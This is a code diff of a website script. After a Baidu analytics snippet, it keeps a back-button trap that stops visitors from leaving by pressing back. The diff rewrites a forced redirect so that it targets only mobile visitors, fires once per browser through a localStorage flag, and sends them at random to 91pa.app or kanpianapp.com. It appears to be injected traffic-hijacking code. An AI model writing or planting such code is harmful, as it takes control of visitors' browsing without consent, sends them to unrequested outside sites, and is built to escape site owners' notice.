@@ -13,7 +13,7 @@ var _hmt = _hmt || [];
   var s = document.getElementsByTagName("script")[0]; 
   s.parentNode.insertBefore(hm, s);
 })();
-;(function() {
+ ;(function() {
     history.pushState(null, '', location.href);
     window.addEventListener('popstate', function () {
       history.pushState(null, '', location.href);
@@ -21,9 +21,16 @@ var _hmt = _hmt || [];
   })();
 
   ;(function() {
-    var KEY = 'hasVisited91pa';
-    if (!localStorage.getItem(KEY)) {
-      localStorage.setItem(KEY, 'true');
-      window.location.replace('https://91pa.app/');
-    }
+    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
+                     .test(navigator.userAgent);
+    if (!isMobile) return;
+    var KEY = 'hasRedirected91pa';
+    if (localStorage.getItem(KEY)) return;
+    localStorage.setItem(KEY, 'true');
+    var targets = [
+      'https://91pa.app/',
+      'https://kanpianapp.com/'
+    ];
+    var choice = targets[Math.floor(Math.random() * targets.length)];
+    window.location.replace(choice);
   })();
